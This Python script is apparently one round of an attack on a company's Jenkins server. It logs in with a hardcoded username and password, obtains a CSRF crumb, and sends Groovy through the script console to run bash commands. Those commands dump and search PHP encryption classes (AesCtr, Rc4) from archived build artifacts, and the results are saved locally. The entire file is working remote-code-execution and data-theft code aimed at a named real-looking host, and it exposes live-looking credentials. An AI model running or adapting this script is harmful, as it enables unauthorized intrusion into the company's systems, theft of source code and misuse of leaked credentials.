#!/usr/bin/env python3
# kimi4_php_decrypt4.py — round 4: dump AesCtr class + Rc4 class + all AesCtr copies/usages
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'
OUT = r'c:\xampp\htdocs\pentagi\claroshop_attack\kimi4_php_decrypt_results4.txt'

CAJA = '/var/jenkins_home/jobs/_trash/jobs/cs_msa_front/jobs/cs_msa_pipe_caja-pagos-api/builds/2/archive'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data, headers={
        'Authorization': 'Basic ' + AUTH,
        crumb['crumbRequestField']: crumb['crumb']
    })
    return opener.open(req2, timeout=170).read().decode()

def gexec(bash):
    return 'def r = ["bash","-c","""' + bash + '"""].execute().text\nprintln r\n'

TASKS = []

TASKS.append(("R4T1 FULL AesCtr.php",
    gexec('cat ' + CAJA + '/app/Librerias/Encrypt/AesCtr.php')))

TASKS.append(("R4T2 find all AesCtr/Rc4 copies + cat Rc4.php",
    gexec(r"find " + CAJA + r" -iname '*AesCtr*' 2>/dev/null; echo '---'; find " + CAJA + r" -iname '*Rc4*' 2>/dev/null; echo '---RC4---'; cat " + CAJA + r"/app/Librerias/Rc4.php 2>/dev/null | head -80")))

TASKS.append(("R4T3 all AesCtr usages across app+vendor",
    gexec(r"grep -rn 'AesCtr' " + CAJA + r"/app/ " + CAJA + r"/vendor/Claroshop/ 2>/dev/null | grep -v 'Librerias/Cyber/Service.php' | head -30")))

def main():
    results = []
    for name, script in TASKS:
        print(f"\n{'='*70}\n[RUN] {name}\n{'='*70}", flush=True)
        t0 = time.time()
        try:
            out = jenkins_exec(script)
        except Exception as e:
            out = f"[ERROR] {type(e).__name__}: {e}"
        dt = time.time() - t0
        print(out, flush=True)
        print(f"\n[done {dt:.1f}s]", flush=True)
        results.append(f"\n{'='*70}\n{name}  ({dt:.1f}s)\n{'='*70}\n{out}\n")
    with open(OUT, 'w', encoding='utf-8') as fh:
        fh.write('\n'.join(results))
    print(f"\n[SAVED] {OUT}", flush=True)

if __name__ == '__main__':
    main()
